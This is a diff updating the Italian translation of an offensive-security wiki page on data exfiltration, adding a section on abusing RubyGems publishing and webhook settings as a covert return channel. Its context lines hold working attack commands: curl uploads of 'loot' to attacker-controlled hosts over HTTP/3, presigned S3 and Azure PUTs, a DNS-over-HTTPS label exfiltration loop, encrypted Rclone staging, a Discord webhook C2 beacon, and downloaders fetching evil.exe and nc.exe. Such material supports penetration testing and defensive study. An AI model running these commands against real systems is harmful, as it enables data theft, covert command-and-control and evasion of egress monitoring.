@@ -1,9 +1,9 @@
-# Exfiltration
+# Esfiltrazione
 
 {{#include ../banners/hacktricks-training.md}}
 
 > [!TIP]
-> Per un esempio end-to-end di staging del loot in `C:\Users\Public` e della sua esfiltrazione con Rclone per simulare backup legittimi, consulta il workflow qui sotto.
+> Per un esempio completo, dall'inizio alla fine, di come predisporre il loot in `C:\Users\Public` ed esfiltrarlo con Rclone per simulare backup legittimi, consulta il workflow qui sotto.
 
 {{#ref}}
 ../windows-hardening/windows-local-privilege-escalation/dll-hijacking/advanced-html-staged-dll-sideloading.md
@@ -11,9 +11,9 @@
 
 ## Domini comunemente inseriti nella whitelist per esfiltrare informazioni
 
-Visita [https://lots-project.com/](https://lots-project.com/) per trovare domini comunemente inseriti nella whitelist che possono essere abusati
+Consulta [https://lots-project.com/](https://lots-project.com/) per trovare domini comunemente inseriti nella whitelist che possono essere usati in modo improprio
 
-## Copia\&Incolla Base64
+## Copia\&incolla Base64
 
 **Linux**
 
@@ -57,10 +57,10 @@ Start-BitsTransfer -Source $url -Destination $output
 Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 ```
 
-### Caricamento di file
+### Caricare file
 
 - [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
-- [**SimpleHttpServer che stampa GET e POST (incluse le intestazioni)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
+- [**SimpleHttpServer che stampa GET e POST (anche gli header)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
 - Modulo Python [uploadserver](https://pypi.org/project/uploadserver/):
 
 ```bash
@@ -76,7 +76,7 @@ curl -X POST http://HOST/upload -H -F 'files=@file.txt'
 # curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
 ```
 
-### **Server HTTPS**
+### **HTTPS Server**
 
 ```python
 # from https://gist.github.com/dergachev/7028596
@@ -121,7 +121,7 @@ if __name__ == "__main__":
 
 ### HTTP/3 / QUIC
 
-Se i controlli sul traffico in uscita sono configurati per ispezionare il traffico **TCP/443** classico ma sono permissivi con **UDP/443**, forzare **HTTP/3** può spostare il trasferimento su **QUIC** anziché su TLS-over-TCP. L'endpoint dell'attaccante deve supportare HTTP/3 nativamente (ad esempio, un reverse proxy o un endpoint di upload che pubblicizza già `Alt-Svc: h3`).
+Se i controlli di egress sono configurati per ispezionare il classico **TCP/443** ma sono permissivi con **UDP/443**, forzare **HTTP/3** può spostare il trasferimento su **QUIC** invece che su TLS-over-TCP. L’endpoint dell’attaccante deve supportare nativamente HTTP/3 (ad esempio, un reverse proxy o un endpoint di upload che pubblicizza già `Alt-Svc: h3`).
 
 ```bash
 # Strict: fail if QUIC/H3 is not available
@@ -135,13 +135,13 @@ curl --alt-svc /tmp/altsvc.cache https://attacker-h3.example/
 curl --alt-svc /tmp/altsvc.cache -T loot.7z https://attacker-h3.example/upload
 ```
 
-Un articolo di ricerca del 2025 (QUIC-Exfil) ha rilevato che gli header crittografati di QUIC e i cambi dinamici di indirizzo possono rendere più difficile il rilevamento dell’exfiltration a livello di firewall rispetto ai canali basati su TLS o DNS, e ha illustrato un metodo basato sull’indirizzo preferito dal server che maschera l’exfiltration da migrazione della connessione lato server.<sup>[[9]](#references)</sup>
+Un paper di ricerca del 2025 (QUIC-Exfil) ha rilevato che le intestazioni cifrate e i cambi dinamici di indirizzo di QUIC possono rendere più difficile il rilevamento dell’esfiltrazione a livello di firewall rispetto ai canali basati su TLS o DNS e ha dimostrato un metodo basato sull’indirizzo preferito dal server che maschera l’esfiltrazione da migrazione della connessione lato server.<sup>[[9]](#references)</sup>
 
-### Upload di object storage pre-firmati / delegati
+### Upload di oggetti su storage delegati / pre-firmati
 
-Quando puoi generare o ottenere un **URL firmato** a breve durata, alla vittima basta un normale client HTTPS. In questo modo non è necessario installare SDK cloud o credenziali a lunga durata sull’host.<sup>[[8]](#references)</sup> Può anche confondersi con il normale traffico di object storage.
+Quando puoi creare o ottenere un **signed URL** a breve durata, alla vittima basta un normale client HTTPS. In questo modo non è necessario installare SDK cloud o credenziali a lunga durata sull’host.<sup>[[8]](#references)</sup> Può inoltre confondersi con il normale traffico verso object storage.
 
-**Linux / macOS (AWS S3 `PUT` pre-firmato)**
+**Linux / macOS (AWS S3 `PUT` pre-firmata)**
 
 ```bash
 curl -X PUT -T loot.7z \
@@ -167,14 +167,14 @@ curl -X PUT --data-binary @loot.7z \
 ```
 
 Note:
-- Gli URL pre-firmati / token SAS in genere limitano **il percorso**, **il metodo HTTP** e **la scadenza**.<sup>[[8]](#references)[[10]](#references)</sup>
+- I Pre-signed URL / token SAS in genere definiscono lo **scope** del **path**, del **metodo HTTP** e della **scadenza**.<sup>[[8]](#references)[[10]](#references)</sup>
 - Per Azure Blob `Put Blob`, `x-ms-blob-type: BlockBlob` è obbligatorio.<sup>[[10]](#references)</sup>
-- Questo schema funziona bene con `curl`, `Invoke-WebRequest` o qualsiasi implant personalizzato in grado di inviare una `PUT` HTTPS raw.
+- Questo pattern funziona bene con `curl`, `Invoke-WebRequest` o qualsiasi implant personalizzato in grado di inviare una `PUT` HTTPS raw.
 
 ### goshs
 
 [goshs](https://github.com/patrickhener/goshs) è un sostituto in un singolo binario di `python3 -m http.server`.<sup>[[4]](#references)</sup>
-Supporta upload, download, WebDAV, SFTP, SMB, TLS, autenticazione, link di condivisione e funzionalità di collaborazione OOB (DNS, SMTP, acquisizione di hash NTLM).<sup>[[4]](#references)</sup>
+Supporta upload, download, WebDAV, SFTP, SMB, TLS, autenticazione, share link e funzionalità di collaborazione OOB (DNS, SMTP, acquisizione di hash NTLM).<sup>[[4]](#references)</sup>
 
 ```bash
 # Serve current directory on port 8000
@@ -205,14 +205,14 @@ goshs -smtp -smtp-domain [REDACTED]
 goshs -tunnel
 ```
 
-## Webhook (Discord/Slack/Teams) per C2 ed esfiltrazione dei dati
+## Webhooks (Discord/Slack/Teams) per C2 ed esfiltrazione dei dati
 
-I webhook sono endpoint HTTPS di sola scrittura che accettano JSON e parti di file opzionali. Sono comunemente consentiti verso domini SaaS affidabili e non richiedono OAuth/API key, il che li rende utili per beaconing ed esfiltrazione a basso attrito.<sup>[[5]](#references)[[6]](#references)</sup>
+I Webhook sono endpoint HTTPS di sola scrittura che accettano JSON e parti file opzionali. Sono comunemente consentiti verso domini SaaS attendibili e non richiedono OAuth/API key, il che li rende utili per beaconing ed esfiltrazione a basso attrito.<sup>[[5]](#references)[[6]](#references)</sup>
 
 Idee chiave:
 - Endpoint: Discord usa https://discord.com/api/webhooks/<id>/<token>
-- POST multipart/form-data con una parte chiamata payload_json contenente {"content":"..."} e una o più parti di file opzionali chiamate file.
-- Schema del ciclo dell’operatore: beacon periodico -> ricognizione delle directory -> esfiltrazione mirata dei file -> dump della ricognizione -> pausa. HTTP 204 NoContent/200 OK conferma la consegna.
+- POST multipart/form-data con una parte chiamata payload_json contenente {"content":"..."} e parti file opzionali chiamate file.
+- Schema del loop dell’operatore: beacon periodico -> ricognizione delle directory -> esfiltrazione mirata dei file -> dump della ricognizione -> sleep. HTTP 204 NoContent/200 OK confermano la consegna.
 
 PoC PowerShell (Discord):
 
@@ -285,20 +285,33 @@ while ($true) {
 ```
 
 Note:
-- Schemi simili si applicano ad altre piattaforme di collaborazione (Slack/Teams) che usano i loro incoming webhook; modifica di conseguenza URL e schema JSON.
+- Pattern simili si applicano ad altre piattaforme di collaborazione (Slack/Teams) usando i relativi incoming webhook; adegua URL e schema JSON di conseguenza.
 - Per l'analisi DFIR degli artefatti della cache di Discord Desktop e il recupero tramite webhook/API, consulta la pagina correlata qui sotto.<sup>[[7]](#references)</sup>
 
 {{#ref}}
 ../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/discord-cache-forensics.md
 {{#endref}}
 
+## Artefatti del registry come canale di ritorno
+
+Quando il codice è già in esecuzione in un worker di build o documentazione e può autenticarsi a un package registry, il registry stesso può fungere da canale di ritorno. Negli esempi GemStuffer, un payload ha creato una **nuova gem** con i file di risposta recuperati e ha tentato di caricarla tramite `/api/v1/gems` di RubyGems; un altro ha scritto la risposta recuperata in `README.md`, rimosso il relativo loader `.yardopts` e tentato di pubblicare una **nuova versione della stessa gem**. Questo è distinto da un hook eseguito al momento dell'installazione e richiede credenziali di pubblicazione valide e accesso in uscita al registry.<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>
+
+Una seconda variante usava la **configurazione dei webhook del registry come storage**, non come callback in uscita. Comprimeva una risposta con zlib, la codificava in Base64 URL-safe, rimuoveva il padding e la suddivideva in segmenti URL numerati di massimo 220 caratteri. Con una chiave autorizzata a gestire i webhook, `POST /api/v1/web_hooks` accetta `gem_name` e `url`; `GET /api/v1/web_hooks.json` elenca gli URL salvati per quell'account. I segmenti numerati, insieme a un marcatore finale, consentono a un lettore autorizzato di ricostruire i dati. L'host `example.com` dell'esempio era solo un segnaposto nel valore salvato, non una prova dell'esistenza di un endpoint C2 funzionante o di una consegna riuscita.<sup>[[13]](#references)[[14]](#references)</sup>
+
+```text
+POST /api/v1/web_hooks   gem_name=<owned-gem>&url=https://example.com/A000/<chunk>/
+GET  /api/v1/web_hooks.json   # read stored URLs using the same account's key
+```
+
+Per l'iniziale [percorso di esecuzione di YARD `.yardopts`](../pentesting-web/dependency-confusion.md#related-pattern-package-controlled-documentation-builds), il registry channel è solo una possibilità post-esecuzione. Un `POST` riuscito o un artifact leggibile in seguito devono essere osservati separatamente; gli esempi citati mostrano principalmente tentativi di pubblicazione e registrazione.<sup>[[12]](#references)[[13]](#references)</sup>
+
 ## Rclone (esfiltrazione su cloud/object storage)
 
-Gli operatori moderni spesso **mettono in staging i loot localmente** e poi usano [Rclone](https://rclone.org/) per far sembrare il trasferimento una normale operazione di backup o sincronizzazione. Uno schema pratico è:
+Gli operatori moderni spesso **preparano loot in locale** e poi usano [Rclone](https://rclone.org/) per far sembrare il trasferimento una normale attività di backup o sync. Un pattern pratico è:
 
 1. Un remote normale (`s3`, `webdav`, `drive`, `mega`, ...)
-2. Un wrapper `crypt` per **crittografare contenuti e nomi dei file lato client**
-3. Un wrapper `chunker` facoltativo, se il provider impone limiti alle dimensioni degli oggetti o se vuoi unità di upload più piccole
+2. Un wrapper `crypt` per **cifrare client-side contenuti e nomi dei file**
+3. Un wrapper `chunker` opzionale se il provider impone limiti alle dimensioni degli object o se vuoi unità di upload più piccole
 
 ```bash
 # 1) Create the storage backend remote (interactive)
@@ -317,10 +330,10 @@ rclone copy /loot secret:$(hostname)-$(date +%F) \
 ```
 
 Note:
-- `crypt` può crittografare sia il contenuto dei file che i nomi.<sup>[[3]](#references)</sup>
+- `crypt` può criptare sia i contenuti dei file sia i nomi.<sup>[[3]](#references)</sup>
 - `chunker` suddivide in modo trasparente i file di grandi dimensioni e li ricompone al download.<sup>[[11]](#references)</sup>
-- `rclone.conf` memorizza i segreti di `crypt` in forma **offuscata**, che non offre una protezione efficace dei dati inattivi.<sup>[[3]](#references)</sup> Per operazioni di breve durata, preferisci una configurazione temporanea dedicata e rimuovila al termine. Se devi conservarla più a lungo, preferisci una gestione della configurazione crittografata (`RCLONE_CONFIG_PASS` / `--password-command`) invece di lasciare un semplice `rclone.conf` sul disco.<sup>[[11]](#references)</sup>
-- Se il target sincronizza già **OneDrive**, **Google Drive** o **Dropbox**, copiare il loot nella directory sincronizzata può sfruttare un client già approvato, invece di installare un nuovo binario di trasferimento.
+- `rclone.conf` memorizza i segreti di `crypt` in forma **offuscata**, non offre una protezione efficace dei dati inattivi.<sup>[[3]](#references)</sup> Per operazioni di breve durata, preferisci una configurazione temporanea dedicata e rimuovila al termine. Se devi conservarla più a lungo, preferisci una gestione della configurazione crittografata (`RCLONE_CONFIG_PASS` / `--password-command`) invece di lasciare un `rclone.conf` non protetto su disco.<sup>[[11]](#references)</sup>
+- Se l'obiettivo sincronizza già **OneDrive**, **Google Drive** o **Dropbox**, copiare il loot nella directory sincronizzata può sfruttare un client già approvato, invece di installare un nuovo binario di trasferimento.
 
 {{#ref}}
 ../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/local-cloud-storage.md
@@ -362,7 +375,7 @@ chown -R ftpuser:ftpgroup /ftphome/
 /etc/init.d/pure-ftpd restart
 ```
 
-### **Client Windows**
+### **Windows** client
 
 ```bash
 #Work well with python. With pure-ftp use fusr:ftp
@@ -414,7 +427,7 @@ WindPS-2> cd new_disk:
 ```
 
 ### goshs
-[goshs](https://github.com/patrickhener/goshs) è un'alternativa composta da un singolo binario che serve file tramite SMB e cattura gli hash NTLM dei client che si connettono.<sup>[[4]](#references)</sup>
+[goshs](https://github.com/patrickhener/goshs) è un'alternativa a binario singolo che serve file tramite SMB e acquisisce hash NTLM dai client che si connettono.<sup>[[4]](#references)</sup>
 
 ```bash
 # Start SMB server with NTLM hash capture
@@ -426,7 +439,7 @@ goshs
 
 ## SCP
 
-L'attaccante deve avere SSHd in esecuzione.
+L’attaccante deve avere SSHd in esecuzione.
 
 ```bash
 scp <username>@<Attacker_IP>:<directory>/<filename>
@@ -434,7 +447,7 @@ scp <username>@<Attacker_IP>:<directory>/<filename>
 
 ## SSHFS
 
-Se la vittima dispone di SSH, l'attaccante può montare una directory della vittima sul sistema dell'attaccante.
+Se la vittima dispone di SSH, l'attaccante può montare una directory dal sistema della vittima sul proprio.
 
 ```bash
 sudo apt-get install sshfs
@@ -491,7 +504,7 @@ sniff(iface="tun0", prn=process_packet)
 
 ## DNS over HTTPS (DoH)
 
-Se il DNS classico su UDP/53 è rumoroso o bloccato, ma il traffico HTTPS in uscita è ampiamente consentito, il consueto schema di esfiltrazione tramite etichette DNS può essere incorporato nelle richieste **DoH** inviate a un resolver pubblico. Mantieni ogni etichetta ben al di sotto del limite di 63 byte e usa un alfabeto compatibile con il DNS, come Base32.
+Se il DNS classico su UDP/53 è rumoroso o bloccato, ma il traffico HTTPS in uscita è ampiamente consentito, il consueto pattern di esfiltrazione tramite etichette DNS può essere incapsulato in richieste DoH verso un resolver pubblico. Mantieni ogni etichetta ben al di sotto del limite DNS di 63 byte e usa un alfabeto compatibile con DNS, come Base32.
 
 ```bash
 # Encode -> split into DNS-safe labels -> send via DoH
@@ -504,13 +517,13 @@ base32 -w0 /tmp/loot.bin | tr -d '=' | tr 'A-Z' 'a-z' | fold -w32 | \
   done
 ```
 
-Sul server DNS autorevole per `exf.attacker.tld`, ordina le query in base al prefisso numerico e ricostruisci il flusso Base32. In questo modo il trasporto passa attraverso HTTPS verso il resolver invece che attraverso il classico DNS su UDP/53.<sup>[[2]](#references)</sup>
+Sul server DNS autorevole per `exf.attacker.tld`, ordina le query in base al prefisso numerico e ricostruisci il flusso Base32. In questo modo, il trasporto rimane all'interno di HTTPS verso il resolver, invece di usare il DNS classico su UDP/53.<sup>[[2]](#references)</sup>
 
-Per strumenti completi per i tunnel DNS bidirezionali (`iodine`, `dnscat2`, ecc.), consulta [la pagina sul tunneling](tunneling-and-port-forwarding.md).
+Per gli strumenti per tunnel DNS bidirezionali completi (`iodine`, `dnscat2` ecc.), consulta [la pagina sul tunneling](tunneling-and-port-forwarding.md).
 
 ## **SMTP**
 
-Se puoi inviare dati a un server SMTP, puoi creare un server SMTP per riceverli con Python:
+Se puoi inviare dati a un server SMTP, puoi crearne uno per ricevere i dati con Python:
 
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
@@ -518,15 +531,15 @@ sudo python -m smtpd -n -c DebuggingServer :25
 
 ### goshs
 
-[goshs](https://github.com/patrickhener/goshs) può avviare rapidamente un server SMTP per intercettare callback email durante scenari di esfiltrazione OOB.<sup>[[4]](#references)</sup>
+[goshs](https://github.com/patrickhener/goshs) può avviare rapidamente un server SMTP per intercettare callback via email durante scenari di esfiltrazione OOB.<sup>[[4]](#references)</sup>
 
 ```bash
 # Start SMTP callback server
 goshs -smtp -smtp-domain [REDACTED]
 ```
 
-Le email ricevute e i callback vengono visualizzati direttamente nell'output del terminale.
-Può essere combinato con il server DNS callback per una copertura OOB completa:
+Le email ricevute e le callback vengono visualizzate direttamente nell'output del terminale.
+Può essere combinato con il server di callback DNS per una copertura OOB completa:
 
 ```bash
 # DNS + SMTP combined
@@ -535,7 +548,7 @@ goshs -dns -dns-ip 10.10.10.10 -smtp -smtp-domain [REDACTED]
 
 ## TFTP
 
-Per impostazione predefinita in XP e 2003 (negli altri sistemi va aggiunto esplicitamente durante l'installazione)
+Per impostazione predefinita in XP e 2003 (negli altri sistemi deve essere aggiunto esplicitamente durante l'installazione)
 
 In Kali, **avvia il server TFTP**:
 
@@ -553,7 +566,7 @@ pip install ptftpd
 ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
 ```
 
-Nella **vittima**, connettiti al server Kali:
+In **victim**, connettiti al server Kali:
 
 ```bash
 tftp -i <KALI-IP> get nc.exe
@@ -561,7 +574,7 @@ tftp -i <KALI-IP> get nc.exe
 
 ## PHP
 
-Scarica un file con un oneliner PHP:
+Scarica un file con una one-liner PHP:
 
 ```bash
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
@@ -609,7 +622,7 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 
 ## Debug.exe
 
-Il programma `debug.exe` non consente solo di ispezionare i file binari, ma ha anche la **capacità di ricostruirli a partire dall'hex**. Ciò significa che, fornendo l'hex di un file binario, `debug.exe` può generare il file binario. Tuttavia, è importante notare che debug.exe ha una **limitazione: può assemblare file con dimensioni fino a 64 kb**.<sup>[[1]](#references)</sup>
+Il programma `debug.exe` non solo consente di ispezionare i binari, ma ha anche la **capacità di ricostruirli a partire dall'hex**. Ciò significa che, fornendo l'hex di un binario, `debug.exe` può generare il file binario. Tuttavia, è importante notare che debug.exe ha una **limitazione: può assemblare file fino a 64 kb**.<sup>[[1]](#references)</sup>
 
 ```bash
 # Reduce the size
@@ -617,19 +630,22 @@ upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
 
-Quindi copia e incolla il testo nella windows-shell e verrà creato un file chiamato nc.exe.
+Quindi copia e incolla il testo nella shell di Windows e verrà creato un file chiamato nc.exe.
 
 ## References
 
-- [1] [Trasferire file su Windows](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
+- [1] [Trasferimento di file su Windows](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
 - [2] [Google Public DNS - DNS-over-HTTPS (DoH)](https://developers.google.com/speed/public-dns/docs/doh)
 - [3] [Backend `crypt` di Rclone](https://rclone.org/crypt/)
 - [4] [goshs](https://github.com/patrickhener/goshs)
-- [5] [Discord come C2 e le prove memorizzate nella cache lasciate sul sistema](https://www.pentestpartners.com/security-blog/discord-as-a-c2-and-the-cached-evidence-left-behind/)
-- [6] [Webhook Discord – Esegui webhook](https://discord.com/developers/docs/resources/webhook#execute-webhook)
+- [5] [Discord come C2 e le tracce nella cache lasciate dietro](https://www.pentestpartners.com/security-blog/discord-as-a-c2-and-the-cached-evidence-left-behind/)
+- [6] [Webhook di Discord – Esegui webhook](https://discord.com/developers/docs/resources/webhook#execute-webhook)
 - [7] [Discord Forensic Suite (parser della cache)](https://github.com/jwdfir/discord_cache_parser)
 - [8] [Caricamento di oggetti con URL presigned - Amazon S3](https://docs.aws.amazon.com/AmazonS3/latest/userguide/PresignedUrlUploadObject.html)
 - [9] [QUIC-Exfil: sfruttare la funzionalità Server Preferred Address di QUIC per eseguire attacchi di esfiltrazione dei dati](https://arxiv.org/abs/2505.05292)
 - [10] [Put Blob (REST API) - Azure Storage](https://learn.microsoft.com/en-us/rest/api/storageservices/put-blob)
 - [11] [Documentazione di Rclone](https://rclone.org/docs/#configuration-encryption)
+- [12] [RubyHack – analisi di RubyGems e RubyDoc](https://www.rubyhack.ai/)
+- [13] [Ricerca sulla sicurezza di JFrog – analisi di GemStuffer](https://research.jfrog.com/post/gemstuffer-openai-rubygems)
+- [14] [API di RubyGems.org – metodi per gem e webhook](https://guides.rubygems.org/rubygems-org-api/)
 {{#include ../banners/hacktricks-training.md}}
